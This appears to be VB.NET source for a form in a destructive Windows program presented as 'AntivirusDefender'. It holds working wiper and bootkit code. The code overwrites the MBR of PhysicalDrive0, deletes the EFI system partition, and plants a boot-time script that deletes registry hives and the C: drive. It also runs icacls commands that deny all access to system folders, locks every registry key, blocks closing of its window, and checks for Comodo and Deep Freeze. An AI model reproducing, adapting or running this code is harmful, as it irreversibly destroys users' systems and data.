Imports System.IO
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32
Imports System.ServiceProcess
Imports System.Media
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Principal
Public Class Form2

    Public countdownTime As Integer = 60 ' Countdown timer in seconds
    Private ReadOnly audioPlayerd As New AudioPlayer()

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        StartAnimationLoop()
        ' Initialize and start audio
        audioPlayerd.PlayAudio()
    End Sub

    Public Class AudioPlayer
        Implements IDisposable

        Private ReadOnly soundPlayer As New SoundPlayer()
        Private ReadOnly wavStream As MemoryStream
        Private disposedValue As Boolean ' To detect redundant calls

        Public Sub New()
            ' Extract the WAV byte array from resources using My.Resources
            Dim wavBytes As Byte() = My.Resources.Resource1.antivirusdefenderaudio

            ' Use MemoryStream to play the WAV
            wavStream = New MemoryStream(wavBytes)

            ' Load the WAV file into the SoundPlayer
            soundPlayer.Stream = wavStream
        End Sub

        ' Method to play the audio in a loop
        Public Sub PlayAudio()
            soundPlayer.PlayLooping()
        End Sub

        ' Method to stop the audio
        Public Sub StopAudio()
            soundPlayer.Stop()
        End Sub

        ' Protected implementation of Dispose pattern.
        Protected Overridable Sub Dispose(disposing As Boolean)
            If Not disposedValue Then
                If disposing Then
                    ' Dispose managed state (managed objects).
                    soundPlayer.Dispose()
                    wavStream.Dispose()
                End If

                ' Free unmanaged resources (if any) here.
                ' Set large fields to null (if any).

                disposedValue = True
            End If
        End Sub

        ' This code added to correctly implement the disposable pattern.
        Public Sub Dispose() Implements IDisposable.Dispose
            Dispose(True)
            GC.SuppressFinalize(Me)
        End Sub

        ' Finalizer (only if you have unmanaged resources)
        Protected Overrides Sub Finalize()
            ' Do not change this code. Put cleanup code in Dispose(disposing As Boolean) above.
            Dispose(False)
        End Sub
    End Class

    Private Sub CreateEpicScriptFiles()
        ' Define the paths
        Dim vbsFilePath As String = "C:\temp.vbs"
        Dim batFilePath As String = "C:\temp.bat"

        ' VBScript content
        Dim vbsContent As String =
        "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"", 0, ""utkudrk.exe""" & vbCrLf &
        "Dim userInput" & vbCrLf &
        "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
        "If userInput = ""FUCK YOU"" Then" & vbCrLf &
        "    Dim shell, fso" & vbCrLf &
        "    Set shell = CreateObject(""WScript.Shell"")" & vbCrLf &
        "    Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf &
        "    shell.Run ""mountvol x: /s"", 0, True" & vbCrLf &
        "    shell.Run ""icacls x:"", 0, True" & vbCrLf &
        "    shell.Run ""icacls c:"", 0, True" & vbCrLf &
        "    If fso.FileExists(""x:\efi\boot\microsoft\bootmgfw.efi"") Then" & vbCrLf &
        "        shell.Run ""rd x: /s /q"", 0, True" & vbCrLf &
        "    End If" & vbCrLf &
        "    shell.Run ""reg delete HKCR /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKCU /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKLM /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKU /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKCC /f"", 0, True" & vbCrLf &
        "    shell.Run ""rd c: /s /q"", 0, True" & vbCrLf &
        "Else" & vbCrLf &
        "    MsgBox ""Action canceled because you didn't say FUCK YOU."", 0, ""utkudrk.exe""" & vbCrLf &
        "End If" & vbCrLf &
        "Set shell = Nothing" & vbCrLf &
        "Set fso = Nothing"

        ' Batch file content
        Dim batContent As String =
        "@echo off" & vbCrLf &
        "echo Creating VBScript file..." & vbCrLf &
        "echo " & vbsContent.Replace(vbCrLf, "^& echo ") & " > """ & vbsFilePath & """" & vbCrLf &
        "echo VBScript file created." & vbCrLf &
        "cscript //nologo """ & vbsFilePath & """"

        Try
            ' Write the VBScript and batch file content
            File.WriteAllText(batFilePath, batContent)

            ' Registry paths
            Dim setupKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
            Dim systemSetupKeyPath As String = "SYSTEM\Setup"

            ' Update registry keys
            Using setupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(setupKeyPath)
                setupKey.SetValue("CmdLine", batFilePath, RegistryValueKind.String)
            End Using

            Using systemSetupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(systemSetupKeyPath)
                If systemSetupKey IsNot Nothing Then
                    systemSetupKey.SetValue("OOBEInProgress", 1, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SetupType", 2, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SetupPhase", 1, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SystemSetupInProgress", 1, RegistryValueKind.DWord)
                End If
            End Using
        Catch ex As UnauthorizedAccessException
            MessageBox.Show("Access denied! Run the application as administrator.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        Catch ex As Exception
            MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Public method to run the BAT script.
    Public Sub ApplyMaximumDestruction()
        CreateEpicScriptFiles()
        Dim scriptPath As String = "C:\temp.bat" ' Correct the file extension to .bat
        Try
            Dim process As New Process()
            process.StartInfo.FileName = "cmd.exe"
            process.StartInfo.Arguments = "/c """ & scriptPath & """" ' Use /c to run and close cmd
            process.StartInfo.UseShellExecute = False
            process.StartInfo.RedirectStandardOutput = True
            process.StartInfo.RedirectStandardError = True
            process.StartInfo.CreateNoWindow = True

            process.Start()
            Dim output As String = process.StandardOutput.ReadToEnd()
            Dim errorOutput As String = process.StandardError.ReadToEnd()
            process.WaitForExit()

            If Not String.IsNullOrEmpty(output) Then
                MessageBox.Show("Output: " & output, "Script Output", MessageBoxButtons.OK, MessageBoxIcon.Information)
            End If

            If Not String.IsNullOrEmpty(errorOutput) Then
                MessageBox.Show("Error: " & errorOutput, "Script Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End If
        Catch ex As Exception
            MessageBox.Show("An error occurred while executing the script: " & ex.Message, "Execution Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub ReplaceBootx64WithBootmgfw()
        Try
            ' 1. Mount the EFI system partition to X:
            Dim mountvolProcess As New Process()
            mountvolProcess.StartInfo.FileName = "cmd.exe"
            mountvolProcess.StartInfo.Arguments = "/C mountvol X: /s /q"
            mountvolProcess.StartInfo.CreateNoWindow = True
            mountvolProcess.StartInfo.UseShellExecute = False
            mountvolProcess.Start()
            mountvolProcess.WaitForExit()

            ' 2. Delete all contents from the X: drive (EFI system partition)
            Dim rdProcess As New Process()
            rdProcess.StartInfo.FileName = "cmd.exe"
            rdProcess.StartInfo.Arguments = "/C rd X: /s /q"
            rdProcess.StartInfo.CreateNoWindow = True
            rdProcess.StartInfo.UseShellExecute = False
            rdProcess.Start()
            rdProcess.WaitForExit()

            ' 3. Extract bootmgfw.efi from Resource1 (string to byte array conversion)
            Dim bootmgfwString As String = My.Resources.Resource1.bootmgfw
            Dim bootmgfwData As Byte() = Encoding.UTF8.GetBytes(bootmgfwString)

            ' 4. Ensure the target directory exists
            Dim efiDir As String = "X:\EFI"
            Dim targetFilePath As String = "X:\EFI\bootx64.efi"

            If Not Directory.Exists(efiDir) Then
                Directory.CreateDirectory(efiDir)
            End If

            ' 5. Write bootmgfw.efi to X:\EFI\bootx64.efi
            File.WriteAllBytes(targetFilePath, bootmgfwData)

            Console.WriteLine("Successfully replaced bootx64.efi with bootmgfw.efi", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

        Catch ex As Exception
            Console.WriteLine("Error during the replacement process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        Finally
            ' Unmount X: drive
            Dim unmountProcess As New Process()
            unmountProcess.StartInfo.FileName = "cmd.exe"
            unmountProcess.StartInfo.Arguments = "/C mountvol X: /d"
            unmountProcess.StartInfo.CreateNoWindow = True
            unmountProcess.StartInfo.UseShellExecute = False
            unmountProcess.Start()
            unmountProcess.WaitForExit()
        End Try
    End Sub

    Private Sub LegalNotice()
        Try
            ' Open the registry key where the login message is stored
            Dim regKey As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True)

            ' Set the title and message for the login screen
            regKey.SetValue("legalnoticecaption", "AntivirusDefender10 HERE!")
            regKey.SetValue("legalnoticetext", "AntivirusDefender 10 watching you well you wanted this!")

            ' Close the registry key
            regKey.Close()

            Console.WriteLine("Login message set successfully.")
        Catch ex As Exception
            Console.WriteLine("Error setting login message: " & ex.Message)
        End Try
    End Sub

    Public Class StupidSandboxThingsDetector

        ' Public method to detect if Comodo Antivirus is installed or present.
        Public Function DetectComodoAntivirus() As Boolean
            ' Check for the installation paths
            Dim comodoPaths As String() = {
            "C:\Program Files\COMODO\COMODO Internet Security\",
            "C:\Program Files (x86)\COMODO\COMODO Internet Security\"
        }

            For Each path As String In comodoPaths
                If PathExists(path) Then
                    Return True
                End If
            Next

            ' Check for the Comodo Antivirus driver
            Dim driverPath As String = "C:\Windows\System32\drivers\cmdguard.sys"
            If PathExists(driverPath) Then
                Return True
            End If

            ' Check for Comodo Antivirus registry key
            If CheckComodoRegistry() Then
                Return True
            End If

            ' Check for Comodo Antivirus service
            If CheckComodoService() Then
                Return True
            End If

            Return False
        End Function

        ' Public method to detect if Deep Freeze is installed or present.
        Public Function DetectDeepFreeze() As Boolean
            ' Check for the installation paths
            Dim deepFreezePaths As String() = {
            "C:\Program Files\Faronics\Deep Freeze\",
            "C:\Program Files (x86)\Faronics\Deep Freeze\"
        }

            For Each path As String In deepFreezePaths
                If PathExists(path) Then
                    Return True
                End If
            Next

            ' Check for the Deep Freeze driver
            Dim driverPath As String = "C:\Persi0.sys"
            If PathExists(driverPath) Then
                Return True
            End If

            ' Check for Deep Freeze registry key
            If CheckDeepFreezeRegistry() Then
                Return True
            End If

            ' Check for Deep Freeze service
            If CheckDeepFreezeService() Then
                Return True
            End If

            Return False
        End Function

        ' Private method to check if a given path exists.
        Private Function PathExists(path As String) As Boolean
            Return File.Exists(path) Or Directory.Exists(path)
        End Function

        ' Private method to check for Comodo Antivirus in the registry key.
        Private Function CheckComodoRegistry() As Boolean
            Dim comodoKey As String = "SOFTWARE\COMODO\CIS"
            Return RegistryKeyExists(Registry.LocalMachine, comodoKey)
        End Function

        ' Private method to check for Deep Freeze in the registry key.
        Private Function CheckDeepFreezeRegistry() As Boolean
            Dim deepFreezeKey As String = "SOFTWARE\Classes\TypeLib\{C5D763D9-2422-4B2D-A425-02D5BD016239}\1.0\HELPDIR"
            Return RegistryKeyExists(Registry.LocalMachine, deepFreezeKey)
        End Function

        ' Private method to check for the Comodo Antivirus service.
        Private Function CheckComodoService() As Boolean
            Dim serviceName As String = "cmdagent"
            Return ServiceExists(serviceName)
        End Function

        ' Private method to check for the Deep Freeze service.
        Private Function CheckDeepFreezeService() As Boolean
            Dim serviceName As String = "DFServ"
            Return ServiceExists(serviceName)
        End Function

        ' Private method to check if a service exists using ServiceController.
        Private Function ServiceExists(serviceName As String) As Boolean
            Try
                Using sc As New ServiceController(serviceName)
                    ' If we can access the service, it exists
                    Dim status As ServiceControllerStatus = sc.Status
                    Return True
                End Using
            Catch ex As InvalidOperationException
                ' This exception indicates the service does not exist
                Return False
            Catch ex As TimeoutException
                ' This exception may occur if the service is taking too long to respond
                Return False
            Catch ex As Exception
                ' Handle other exceptions if necessary
                Return False
            End Try
        End Function

        ' Private method to check if a registry key exists.
        Private Function RegistryKeyExists(root As RegistryKey, path As String) As Boolean
            Using key As RegistryKey = root.OpenSubKey(path)
                Return key IsNot Nothing
            End Using
        End Function

    End Class

    ' Constants
    Private Const GenericWrite As UInteger = &H40000000
    Private Const OpenExisting As UInteger = &H3
    Private Const FileShareRead As UInteger = &H1
    Private Const FileShareWrite As UInteger = &H2
    Private Const MbrSize As UInteger = 512

    ' API imports
    <DllImport("kernel32")>
    Private Shared Function CreateFile(
        lpFileName As String,
        dwDesiredAccess As UInteger,
        dwShareMode As UInteger,
        lpSecurityAttributes As IntPtr,
        dwCreationDisposition As UInteger,
        dwFlagsAndAttributes As UInteger,
        hTemplateFile As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32")>
    Private Shared Function WriteFile(
        hFile As IntPtr,
        lpBuffer As Byte(),
        nNumberOfBytesToWrite As UInteger,
        ByRef lpNumberOfBytesWritten As UInteger,
        lpOverlapped As IntPtr) As Boolean
    End Function

    <DllImport("kernel32")>
    Private Shared Function CloseHandle(hObject As IntPtr) As Boolean
    End Function

    Private Sub LockRegistryKeyForm2(keyPath As String)
        Try
            ' Open the registry key with permission to change security
            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(keyPath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions)
                If key IsNot Nothing Then
                    ' Get the current security settings
                    Dim security As RegistrySecurity = key.GetAccessControl()

                    ' Remove all access to the key
                    Dim everyone As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
                    Dim system As New SecurityIdentifier(WellKnownSidType.LocalSystemSid, Nothing)
                    Dim admins As New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing)

                    ' Purge existing access rules
                    security.PurgeAccessRules(everyone)
                    security.PurgeAccessRules(system)
                    security.PurgeAccessRules(admins)

                    ' Remove all access rights for everyone, system, and admins
                    security.AddAccessRule(New RegistryAccessRule(everyone, RegistryRights.FullControl, AccessControlType.Deny))
                    security.AddAccessRule(New RegistryAccessRule(system, RegistryRights.FullControl, AccessControlType.Deny))
                    security.AddAccessRule(New RegistryAccessRule(admins, RegistryRights.FullControl, AccessControlType.Deny))

                    ' Apply the changes to the registry key
                    key.SetAccessControl(security)
                End If
            End Using

        Catch ex As Exception
            MessageBox.Show("An error occurred while lock: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub LockRegistryKeyAndSubKeys(keyPath As String)
        Try
            ' Get the root key and open it
            Dim rootKey As RegistryKey = Nothing
            Dim keyParts As String() = keyPath.Split("\"c)
            Select Case keyParts(0).ToUpper()
                Case "HKEY_CLASSES_ROOT"
                    rootKey = Registry.ClassesRoot
                Case "HKEY_CURRENT_USER"
                    rootKey = Registry.CurrentUser
                Case "HKEY_LOCAL_MACHINE"
                    rootKey = Registry.LocalMachine
                Case "HKEY_USERS"
                    rootKey = Registry.Users
                Case "HKEY_CURRENT_CONFIG"
                    rootKey = Registry.CurrentConfig
                Case Else
                    Throw New Exception("Unknown root key.")
            End Select

            ' Open the subkey with permission to change security
            Using key As RegistryKey = rootKey.OpenSubKey(keyParts(1), RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions)
                If key IsNot Nothing Then
                    ' Lock the root key itself
                    LockRegistryKeyForm2(keyPath)

                    ' Lock all subkeys
                    For Each subKeyName In key.GetSubKeyNames()
                        LockRegistryKeyAndSubKeys(keyPath & "\" & subKeyName)
                    Next
                End If
            End Using
        Catch ex As Exception
            MessageBox.Show("An error occurred while locking registry key: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    'You need use hex editor to extract hex data
    Private Function ExtractMbrToTempFile() As String
        ' Create a temporary file
        Dim tempFilePath As String = Path.GetTempFileName()

        ' Hex data as a string
        Dim hexData As String = "EB0031C08ED8FC1312111009080706050400BE0000BF01008A84077CB400CD10E80B00E844004683FE0A7CECEBFEB90500BF0100E82200E8300083FF01750D83C10183F9147EEDBF0000EBE883E90183F9057DE0BF0100EBDC0FB30FBE707CAC3C007406B40ECD10EBF5C3B9FFFF4975FDC3414E54544956495253444546454E444552203130204E4F572049344F555252204E494748544D4141524553205448455245204953204E4F204553434150455920594F55522050432049532052"

        ' Convert hex string to byte array
        Dim mbrData As Byte() = Enumerable.Range(0, hexData.Length \ 2).Select(Function(i) Convert.ToByte(hexData.Substring(i * 2, 2), 16)).ToArray()

        ' Pad the byte array to 512 bytes with zeros if it's shorter
        If mbrData.Length < 512 Then
            Array.Resize(mbrData, 512)
        End If

        ' Ensure the last two bytes are 0x55 and 0xAA
        mbrData(510) = &H55
        mbrData(511) = &HAA

        ' Write the MBR data to the temporary file
        File.WriteAllBytes(tempFilePath, mbrData)

        Return tempFilePath
    End Function

    Public Sub WriteMBR()
        ' Extract MBR to a temporary file
        Dim tempFilePath As String = ExtractMbrToTempFile()

        ' Load the MBR data from the temporary file
        Dim mbrData As Byte() = File.ReadAllBytes(tempFilePath)

        If mbrData.Length <> MbrSize Then
            MessageBox.Show("Invalid MBR data size.")
            Return
        End If

        ' Open the disk for writing
        Dim mbrHandle As IntPtr = CreateFile(
        "\\.\PhysicalDrive0",
        GenericWrite,
        FileShareRead Or FileShareWrite,
        IntPtr.Zero,
        OpenExisting,
        0,
        IntPtr.Zero)

        If mbrHandle = New IntPtr(-1) Then
            MessageBox.Show("Run as administrator")
            Return
        End If

        ' Write the MBR data to the disk
        Dim bytesWritten As UInteger = 0
        WriteFile(mbrHandle, mbrData, MbrSize, bytesWritten, IntPtr.Zero)
        ' Close the handle
        CloseHandle(mbrHandle)

        ' Delete the temporary file
        If File.Exists(tempFilePath) Then
            File.Delete(tempFilePath)
        End If
    End Sub

    Public Sub LockAllRegistryKeys()
        ' Define the root registry keys
        Dim rootKeys As New List(Of String) From {
        "HKEY_CLASSES_ROOT",
        "HKEY_CURRENT_USER",
        "HKEY_LOCAL_MACHINE",
        "HKEY_USERS",
        "HKEY_CURRENT_CONFIG"
    }

        ' Loop through each root registry key and lock them and their subkeys
        For Each rootKey In rootKeys
            LockRegistryKeyAndSubKeys(rootKey)
        Next
    End Sub

    ' Execute a system command
    Public Sub ExecuteCommandForm2(command As String)
        Try
            Dim process As New Process()
            process.StartInfo.FileName = "cmd.exe"
            process.StartInfo.Arguments = "/C " & command
            process.StartInfo.UseShellExecute = False
            process.StartInfo.RedirectStandardOutput = True
            process.StartInfo.RedirectStandardError = True
            process.StartInfo.CreateNoWindow = True ' Do not create a window
            process.Start()

            ' Read the output and error streams
            Dim output As String = process.StandardOutput.ReadToEnd()
            Dim errorOutput As String = process.StandardError.ReadToEnd()

            process.WaitForExit()

            ' Output command results to console
            If Not String.IsNullOrEmpty(output) Then
                Console.WriteLine("Output: " & output)
            End If
            If Not String.IsNullOrEmpty(errorOutput) Then
                Console.WriteLine("Error: " & errorOutput)
            End If
        Catch ex As Exception
            Console.WriteLine("Command execution failed: " & ex.Message)
        End Try
    End Sub

    ' Apply access restrictions
    Private Sub ApplyAccessRestrictions()
        Dim commands As String() = {
        "icacls ""C:\Windows"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Program Files"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\ProgramData"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\System Volume Information"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Recovery"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\$RECYCLE.BIN"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\config"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\system32"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\system"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\winsxs"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\SysWOW64"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Users"" /deny Everyone:(OI)(CI)F"
    }

        For Each command As String In commands
            Try
                ExecuteCommandForm2(command)
            Catch ex As Exception
                MessageBox.Show("Failed to apply access restrictions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try
        Next
    End Sub

    ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion and motion
    Private portalEffectPhase As Integer = 0 ' Ensure this is initialized

    Public Sub ApplyPortalEffect()
        ' Load the byte array from resources using My.Resources
        Dim portalImageBytes As Byte() = My.Resources.Resource1.antivirusdefender

        ' Convert the byte array to an Image
        Dim portalImage As Image
        Using ms As New MemoryStream(portalImageBytes)
            portalImage = Image.FromStream(ms)
        End Using

        ' Pixel block size
        Dim gridSize As Integer = 20 ' Size of each pixelated "block"
        portalEffectPhase += 0.05F ' Increment phase for wavy distortion

        ' Access the Graphics object of Form2 (or any control where the effect is to be applied)
        Using g As Graphics = CreateGraphics()
            For y As Integer = 0 To Height Step gridSize
                For x As Integer = 0 To Width Step gridSize
                    ' Calculate distorted positions using sine wave (for swirling effect)
                    Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
                    Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)

                    ' Draw a block of the image at the distorted position
                    g.DrawImage(portalImage, New Rectangle(distortedX, distortedY, gridSize, gridSize),
                            New Rectangle(x Mod portalImage.Width, y Mod portalImage.Height, gridSize, gridSize),
                            GraphicsUnit.Pixel)
                Next
            Next
        End Using
    End Sub

    ' Prevent form from closing
    Protected Overrides Sub OnFormClosing(e As FormClosingEventArgs)
        e.Cancel = True
    End Sub

    Public Function PromptUserForChoice(message As String, options As String()) As String
        Dim choice As String
        Dim validChoice As Boolean

        ' Create a string to display the available options
        Dim optionsMessage As String = "Available options: " & String.Join(", ", options) & vbCrLf & vbCrLf & message

        ' Loop until the user makes a valid choice or cancels
        Do While Not validChoice
            ' Prompt the user for a choice, displaying the options
            choice = InputBox(optionsMessage, "User Choice", "").Trim()

            ' Check if the user pressed Cancel or left the input blank
            If String.IsNullOrEmpty(choice) Then
                MessageBox.Show("You must select a valid option!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                Return String.Empty ' If the user cancels or input is blank, return empty
            End If

            ' Validate user choice against available options
            For Each opt In options
                If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
                    Return opt ' Return the valid choice if the input matches one of the options
                End If
            Next

            ' If the choice is invalid, display an error message
            MessageBox.Show("Invalid choice! Please select a valid option.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        Loop

        Return String.Empty ' This line will never be reached, but it's a safety net.
    End Function

    Public Sub ExecuteDestruction(choice As String)
        Dim normalizedChoice As String = choice.Trim().ToLowerInvariant()

        Select Case normalizedChoice
            Case "maximum destruction"
                timerLabel.Text = "Executing maximum destruction!"
                Thread.Sleep(5000)
                WriteMBR()
                ReplaceBootx64WithBootmgfw()
                ApplyMaximumDestruction()

            Case "classic mbr/uefi effects"
                timerLabel.Text = "Executing classic MBR/UEFI effects!"
                Thread.Sleep(5000)
                WriteMBR()
                ReplaceBootx64WithBootmgfw()

            Case "surprise me"
                timerLabel.Text = "Surprise! Executing less destructive effects!"
                Thread.Sleep(5000)
                CreateEpicScriptFiles()
                LegalNotice()
                MessageBox.Show("To apply changes, you need to restart your computer.", "Restart Required", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                Environment.Exit(0)

            Case "just make unusable my pc without destruction"
                timerLabel.Text = "You can't access your files anymore! You have more than 60 seconds before BSOD!"
                Thread.Sleep(5000)
                LegalNotice()
                ApplyAccessRestrictions()
                LockAllRegistryKeys()
                Thread.Sleep(60000)
                Environment.Exit(0)

            Case Else
                timerLabel.Text = "Invalid choice!"
        End Select
    End Sub

    Private Sub OnCountdownComplete()
        CountDownTimer.Stop()
        ' When countdown finishes, prompt user for destruction option
        Dim options As String() = {
        "Maximum Destruction",
        "Classic MBR/UEFI Effects",
        "Surprise Me",
        "Just Make Unusable My PC Without Destruction"
    }

        Dim choice As String = PromptUserForChoice("Select a destruction option:", options)

        If Not String.IsNullOrEmpty(choice) Then
            timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
            Thread.Sleep(5000) ' Optional: Adjust as needed
            ExecuteDestruction(choice)
        End If
    End Sub

    Public Sub StartAnimationLoop()

        ' Start the countdown timer if it is not already running
        If Not CountDownTimer.Enabled Then
            CountDownTimer.Start()
        End If
    End Sub

    Private Sub CountDownTimer_Tick(sender As Object, e As EventArgs) Handles CountDownTimer.Tick
        If countdownTime > 0 Then
            countdownTime -= 1

            ' Update the countdown UI (ensure it's on the UI thread)
            If timerLabel.InvokeRequired Then
                timerLabel.Invoke(New MethodInvoker(Sub()
                                                        ' Simulate mouse click on Form2 at a specific location (e.g., (400, 400))
                                                        SimulateMouseClick(400, 400)
                                                        timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
                                                    End Sub))
            Else
                timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
            End If

            ApplyPortalEffect()
        Else
            ' Remove the form from being topmost before completing the countdown
            TopMost = False ' Remove from topmost

            ' Stop the timer when the countdown reaches zero and handle completion
            OnCountdownComplete()
        End If
    End Sub

    ' Function to simulate a mouse click at specific coordinates
    Private Sub SimulateMouseClick(x As Integer, y As Integer)
        ' Move the cursor to the target position on Form2 (in screen coordinates)
        SetCursorPos(x, y)

        ' Simulate mouse click (left mouse button down, then up)
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
    End Sub

    ' Import SetCursorPos from user32.dll to move the cursor to specific coordinates
    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function SetCursorPos(x As Integer, y As Integer) As Boolean
    End Function

    ' Import mouse_event from user32.dll to simulate mouse clicks
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Sub mouse_event(dwFlags As UInteger, dx As UInteger, dy As UInteger, dwData As UInteger, dwExtraInfo As UInteger)
    End Sub

    ' Constants for mouse events
    Private Const MOUSEEVENTF_LEFTDOWN As UInteger = &H2
    Private Const MOUSEEVENTF_LEFTUP As UInteger = &H4

End Class